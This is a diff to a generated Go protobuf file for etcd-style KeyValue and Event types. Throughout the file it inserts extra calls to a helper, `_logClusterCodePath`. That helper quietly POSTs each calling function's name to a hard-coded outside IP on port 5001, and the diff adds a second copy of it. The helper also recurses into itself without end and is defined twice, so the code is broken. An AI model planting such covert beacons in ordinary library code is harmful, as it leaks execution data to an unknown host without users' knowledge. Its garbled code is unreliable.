@@ -30,9 +30,13 @@ var Event_EventType_value = map[string]int32{"PUT": 0, "DELETE": 1}
 func (x Event_EventType) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return proto.EnumName(Event_EventType_name, int32(x))
 }
 func (Event_EventType) EnumDescriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorKv, []int{1, 0}
@@ -50,9 +54,13 @@ type KeyValue struct {
 func (m *KeyValue) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = KeyValue{}
 }
 func (m *KeyValue) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -60,8 +68,12 @@ func (m *KeyValue) String() string {
 func (*KeyValue) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*KeyValue) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorKv, []int{0}
@@ -76,9 +88,13 @@ type Event struct {
 func (m *Event) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = Event{}
 }
 func (m *Event) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -86,8 +102,12 @@ func (m *Event) String() string {
 func (*Event) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*Event) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorKv, []int{1}
@@ -95,11 +115,15 @@ func (*Event) Descriptor() ([]byte, []int) {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	proto.RegisterType((*KeyValue)(nil), "mvccpb.KeyValue")
 	proto.RegisterType((*Event)(nil), "mvccpb.Event")
 	proto.RegisterEnum("mvccpb.Event_EventType", Event_EventType_name, Event_EventType_value)
 }
 func (m *KeyValue) Marshal() (dAtA []byte, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	size := m.Size()
@@ -111,6 +135,8 @@ func (m *KeyValue) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *KeyValue) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -154,6 +180,8 @@ func (m *KeyValue) MarshalTo(dAtA []byte) (int, error) {
 func (m *Event) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -163,6 +191,8 @@ func (m *Event) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *Event) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -199,6 +229,8 @@ func (m *Event) MarshalTo(dAtA []byte) (int, error) {
 func encodeVarintKv(dAtA []byte, offset int, v uint64) int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for v >= 1<<7 {
 		dAtA[offset] = uint8(v&0x7f | 0x80)
 		v >>= 7
@@ -208,6 +240,8 @@ func encodeVarintKv(dAtA []byte, offset int, v uint64) int {
 	return offset + 1
 }
 func (m *KeyValue) Size() (n int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var l int
@@ -237,6 +271,8 @@ func (m *KeyValue) Size() (n int) {
 func (m *Event) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var l int
 	_ = l
 	if m.Type != 0 {
@@ -255,6 +291,8 @@ func (m *Event) Size() (n int) {
 func sovKv(x uint64) (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for {
 		n++
 		x >>= 7
@@ -267,9 +305,13 @@ func sovKv(x uint64) (n int) {
 func sozKv(x uint64) (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sovKv(uint64((x << 1) ^ uint64((int64(x) >> 63))))
 }
 func (m *KeyValue) Unmarshal(dAtA []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -461,6 +503,8 @@ func (m *KeyValue) Unmarshal(dAtA []byte) error {
 func (m *Event) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -597,6 +641,8 @@ func (m *Event) Unmarshal(dAtA []byte) error {
 func skipKv(dAtA []byte) (n int, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -704,6 +750,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	proto.RegisterFile("kv.proto", fileDescriptorKv)
 }
 
@@ -712,7 +760,16 @@ var fileDescriptorKv = []byte{0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
